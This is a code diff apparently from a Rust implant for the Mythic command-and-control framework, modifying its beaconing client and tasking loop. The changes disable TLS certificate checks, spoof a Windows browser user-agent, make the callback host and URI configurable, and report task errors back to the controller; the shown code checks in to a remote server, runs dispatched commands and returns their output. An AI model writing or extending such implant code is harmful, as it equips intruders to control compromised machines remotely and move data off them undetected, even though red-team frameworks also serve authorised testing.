@@ -71,7 +71,9 @@ pub struct PostResponseMessage<'a> {
 
 pub fn build_client() -> reqwest::blocking::Client {
     reqwest::blocking::Client::builder()
-        .danger_accept_invalid_hostnames(true)
+        .danger_accept_invalid_certs(true)
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        .timeout(std::time::Duration::from_secs(30))
         .build()
         .expect("reqwest client init failed")
 }
@@ -84,10 +86,7 @@ pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
     let mut h = Sha256::new();
     h.update(secret);
     h.update(salt.as_bytes());
-    let result = h.finalize();
-    let mut key = [0u8; 32];
-    key.copy_from_slice(&result[..32]);
-    key
+    h.finalize().into()
 }
 
 /// Build a Mythic wire message: UUID(36) + base64(nonce_12 || AES-256-GCM(json)).
@@ -254,7 +253,7 @@ pub fn extract_param(parameters: &str, key: &str) -> String {
                 _ => val.to_string(),
             })
         })
-        .unwrap_or_else(|| parameters.to_string())
+        .unwrap_or_default()
 }
 
 pub fn list_dir(path: &str) -> String {
@@ -361,6 +360,7 @@ pub fn run_c2_loop<F>(
     callback: &str,
     implant_secret: &str,
     payload_uuid: &str,
+    callback_uri: &str,
     reg: RegisterInfo,
     dispatch: F,
 ) where
@@ -371,8 +371,12 @@ pub fn run_c2_loop<F>(
         decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());
 
     let client = build_client();
-    let base = format!("https://{}", decrypted_callback);
-    let uri = "/";
+    let base = if decrypted_callback.starts_with("http") {
+        decrypted_callback.to_string()
+    } else {
+        format!("https://{}", decrypted_callback)
+    };
+    let uri = if callback_uri.is_empty() { "/" } else { callback_uri };
 
     // ── Checkin ───────────────────────────────────────────────────────────────
     let checkin = CheckinMessage {
@@ -463,11 +467,12 @@ pub fn run_c2_loop<F>(
                 return;
             }
             let output = dispatch(&task.command, &task.parameters);
+            let is_error = output.starts_with("[-]");
             responses.push(TaskResponse {
                 task_id: task.id.clone(),
                 completed: true,
                 user_output: output,
-                status: None,
+                status: if is_error { Some("error".to_string()) } else { None },
             });
         }
 
